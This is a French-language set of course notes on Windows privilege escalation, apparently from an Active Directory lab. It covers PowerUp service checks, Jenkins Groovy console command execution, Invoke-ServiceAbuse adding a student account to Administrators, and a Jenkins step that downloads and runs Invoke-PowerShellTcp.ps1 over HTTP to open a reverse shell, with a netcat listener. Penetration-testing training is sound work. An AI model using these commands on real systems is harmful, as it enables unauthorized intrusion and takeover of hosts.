---
title: "2 - Windows Privilege Escalation"
---

# Windows Privilege Escalation

## Vecteurs d'élévation locale

Configurations et vulnérabilités susceptibles d'accorder des privilèges supplémentaires :

- Correctifs de sécurité manquants.
- Déploiement automatisé et mots de passe AutoLogon stockés en clair.
- AlwaysInstallElevated : configuration pouvant permettre l'installation de fichiers MSI avec les droits SYSTEM.
- Services mal configurés.
- DLL Hijacking.
- NTLM Relaying.

## Outils

[PowerSploit - Privesc Module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)

[Privesc on GitHub](https://github.com/enjoiz/Privesc)

[winPEAS in PEASS-ng](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

## Services Windows - PowerUp

### Unquoted Service Paths
Identifier les services dont le chemin de l'exécutable contient des espaces et n'est pas entouré de guillemets.
```powershell
Get-ServiceUnquoted -Verbose
```

### Modifiable Service Files
Identifier les services dont le compte courant peut modifier les fichiers exécutables ou dont les arguments sont modifiables.
```powershell
Get-ModifiableServiceFile -Verbose
```

### Modifiable Services
Identifier les services dont la configuration est modifiable par le compte courant.
```powershell
Get-ModifiableService -Verbose
```

### Audit automatisé
Exécuter les vérifications proposées par PowerUp, Privesc et winPEAS.
```powershell
# PowerUp:
Invoke-AllChecks

# Privesc:
Invoke-PrivEsc

# PEASS-ng:
winPEASx64.exe
```

## Jenkins
### Console Groovy
La console d'administration Jenkins (`/script`) permet aux utilisateurs autorisés d'exécuter des scripts Groovy.
Les droits associés à cette console sont particulièrement sensibles.

```powershell
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '
[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

### Étapes de build
Les permissions de modification d'un job Jenkins permettent de définir les actions exécutées lors du build, selon les droits du processus Jenkins.
```powershell
powershell -c <command>
```

## Exercices de laboratoire

- Étudier les permissions des services Windows et les risques d'élévation locale.
- Identifier les machines sur lesquelles le compte dispose de droits administrateur locaux.
- Examiner les risques liés aux permissions Jenkins et aux comptes de service.

### Services Windows
Exemple du laboratoire associé aux permissions de service.
```powershell
Invoke-ServiceAbuse -Name 'AbyssWebServer' -Username dcorp\studentx -Verbose
net localgroup Administrators
```

### Droits administrateur distants
Vérification des droits locaux via PowerShell Remoting.
```powershell
Find-PSRemotingLocalAdminAccess
```

### Exécution distante
Exemple original du laboratoire Jenkins.
```powershell
on Jenkins> powershell iex (iwr -UseBasicParsing http://172.16.100.1/Invoke-PowerShellTcp.ps1); power -Reverse -IPAddress 172.16.100.1 -Port 443
on Attacker> host the file in a webserver - example: HFS - HTTP File Server 
```

### Connexion réseau
Vérifier les règles de filtrage réseau applicables dans le laboratoire.
```powershell
on Attacker> netcat-win32-1.12.exe -lvp 443
```

